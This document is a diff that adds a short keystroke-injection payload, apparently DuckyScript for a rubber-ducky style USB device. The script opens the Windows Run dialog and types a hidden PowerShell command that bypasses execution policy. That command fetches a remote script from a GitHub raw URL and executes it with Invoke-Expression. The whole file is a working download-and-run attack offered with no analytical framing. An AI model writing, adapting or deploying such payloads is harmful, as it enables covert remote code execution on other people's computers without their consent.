@@ -1,0 +1,6 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -NoExit -W Hidden -Exec Bypass $pl = Invoke-WebRequest "https://raw.githubusercontent.com/arratres/papayed/main/papay-me.ps1"; Invoke-Expression $pl
+DELAY 500
+ENTER
